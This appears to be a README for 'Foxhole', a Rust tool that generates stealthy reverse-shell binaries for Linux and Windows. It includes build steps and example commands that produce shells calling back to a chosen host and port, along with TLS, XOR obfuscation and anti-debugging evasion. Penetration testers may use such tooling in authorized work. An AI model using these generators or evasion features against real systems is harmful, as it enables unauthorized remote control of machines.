# Foxhole

A stealthy, cross-platform reverse shell generator written in Rust.

## Features

- Cross-platform support (Linux and Windows)
- TLS encryption support
- XOR encryption for sensitive data
- Anti-debugging capabilities
- Connection retry with exponential backoff
- Customizable shell path
- Minimal and fast binaries
- Release mode compilation for smaller size

## Installation

```bash
git clone https://github.com/ArsCodeAmatoria/foxhole.git
cd foxhole
cargo build --release
```

## Usage

```bash
foxhole --ip <target_ip> --port <target_port> --os <linux|windows> [--shell <shell_path>] [--tls] [--anti-debug] --output <output_path>
```

### Command Line Arguments

- `--ip`: Target IP address or hostname
- `--port`: Target port number
- `--os`: Target operating system (linux or windows)
- `--shell`: Custom shell path (optional)
- `--tls`: Enable TLS encryption
- `--anti-debug`: Enable anti-debugging features
- `--output`: Output binary path

### Examples

Basic Linux reverse shell:
```bash
foxhole --ip 192.168.1.100 --port 4444 --os linux --output shell
```

Windows reverse shell with TLS and anti-debugging:
```bash
foxhole --ip example.com --port 443 --os windows --tls --anti-debug --output shell.exe
```

Custom shell path with all features:
```bash
foxhole --ip 192.168.1.100 --port 4444 --os linux --shell /bin/bash --tls --anti-debug --output shell
```

### Anti-Debugging Features

When enabled, the generated binary includes:
- Debugger detection for Windows and Linux
- Process monitoring for common debuggers (GDB, LLDB, IDA, etc.)
- Sleep detection to detect time manipulation
- Automatic termination if debugging is detected

### Connection Features

The generated binary includes:
- Automatic connection retry with exponential backoff
- Configurable retry parameters
- TLS support with proper error handling
- XOR encryption for sensitive data

## Requirements

- Rust toolchain (latest stable)
- `rustc` compiler
- For cross-compilation: `cross` (optional)

## Building for Different Platforms

### Linux to Windows Cross-Compilation

```bash
cross build --release --target x86_64-pc-windows-msvc
```

### Windows to Linux Cross-Compilation

```bash
cross build --release --target x86_64-unknown-linux-gnu
```

## Security Note

This tool is for educational and authorized testing purposes only. Unauthorized use on systems you don't own or have permission to test is illegal. 